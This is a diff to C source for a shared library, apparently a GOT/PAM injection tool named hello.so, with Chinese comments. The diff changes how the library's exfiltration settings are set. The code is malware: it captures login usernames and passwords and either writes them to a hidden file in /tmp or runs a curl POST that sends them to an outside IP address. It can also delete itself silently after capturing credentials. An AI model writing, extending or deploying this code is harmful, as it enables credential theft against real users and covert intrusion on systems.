@@ -30,17 +30,35 @@
 #define MAX_BUF_SIZE 1024
 #define MAX_PATH 255
 
-/* ======================= 外发配置(install.sh 生成时会替换) ======================= */
+/* ======================= 外发配置 =======================
+ * 以下为默认值; install.sh 通过编译期宏注入配置, 例如:
+ *   gcc -shared inject_got.c -o hello.so -ldl -fPIC -std=c99 \
+ *       -DSEND_MODE_DEFAULT=1 \
+ *       -DSEND_TARGET_DEFAULT=\"curl -X POST -d 'username=%s&password=%s' http://x.x.x.x\"
+ * 手工编译(调试)时不带宏, 即为这里的默认值.
+ */
 
-int SEND_MODE = 0;  /* 0 = 写文件模式, 1 = 命令执行模式 */
-char SEND_TARGET[MAX_PATH] = "/tmp/.password.txt"; /* SEND_MODE=0: 密码写入的文件路径; SEND_MODE=1: 命令模板, 两个 %s 分别对应用户名/密码 */
-char EVIL_SO_PATH[] = "/tmp/hello.so"; /* 自身落盘路径, 静默销毁时用于 rm */
-int SILENT_MODE = 0;  /* 0 = 关闭, 1 = 捕获到密码后自删除退出 */
-char SILENT_USER[] = "anyone"; /* SILENT_MODE=1 时: anyone 表示任意用户登录成功即销毁; 其他值则登录用户名命中时才销毁 */
+#ifndef SEND_MODE_DEFAULT
+#define SEND_MODE_DEFAULT 0 /* 0 = 写文件模式, 1 = 命令执行模式 */
+#endif
+#ifndef SEND_TARGET_DEFAULT
+#define SEND_TARGET_DEFAULT "/tmp/.password.txt" /* 写文件模式: 密码输出文件路径 */
+#endif
+#ifndef EVIL_SO_PATH_DEFAULT
+#define EVIL_SO_PATH_DEFAULT "/tmp/hello.so" /* 自身落盘路径, 静默销毁时用于 rm */
+#endif
+#ifndef SILENT_MODE_DEFAULT
+#define SILENT_MODE_DEFAULT 0 /* 0 = 关闭, 1 = 捕获到密码后自删除退出 */
+#endif
+#ifndef SILENT_USER_DEFAULT
+#define SILENT_USER_DEFAULT "anyone" /* anyone = 任意用户登录成功即销毁; 其他值 = 登录用户名命中时销毁 */
+#endif
 
-/* 命令执行模式示例: */
-// int SEND_MODE = 1;
-// char SEND_TARGET[MAX_PATH] = "curl -X POST -d 'username=%s&password=%s' http://127.0.0.1";
+int SEND_MODE = SEND_MODE_DEFAULT;              /* SEND_MODE=1 时 SEND_TARGET 为命令模板, 两个 %s 对应用户名/密码 */
+char SEND_TARGET[MAX_PATH] = SEND_TARGET_DEFAULT;
+char EVIL_SO_PATH[] = EVIL_SO_PATH_DEFAULT;
+int SILENT_MODE = SILENT_MODE_DEFAULT;
+char SILENT_USER[] = SILENT_USER_DEFAULT;
 
 /*
  * libpam 中 pam_handle 的内存布局(仅前缀部分).
